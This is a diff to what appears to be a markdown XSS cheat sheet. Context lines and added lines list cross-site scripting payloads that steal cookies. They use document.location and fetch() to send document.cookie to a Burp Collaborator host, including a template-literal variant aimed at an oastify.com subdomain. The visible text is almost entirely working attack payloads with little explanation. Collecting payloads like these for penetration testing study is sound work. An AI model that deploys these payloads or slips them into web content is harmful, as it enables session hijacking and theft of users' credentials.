@@ -19,6 +19,16 @@ JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie
 \"-fetch('https://Collaborator.com?cs='+btoa(document.cookie))}//
 ```  
 
+>JavaScript Template literals are enclosed by backtick ( \` ) characters instead of double or single quotes.  
+
+```JavaScript
+${document.location='https://tvsw9dim0doynnpscx9mgtq67xdo1jp8.oastify.com/?cookies='+document.cookie;}
+```  
+
+![javascript-template-string.png](../images/javascript-template-string.png)  
+
+>More Cross-Site Scripting (XSS) example cookie stealer payloads.  
+
 ```Javascript
 <script>
 document.location='https://Collaborator.com/?cookiestealer='+document.cookie;
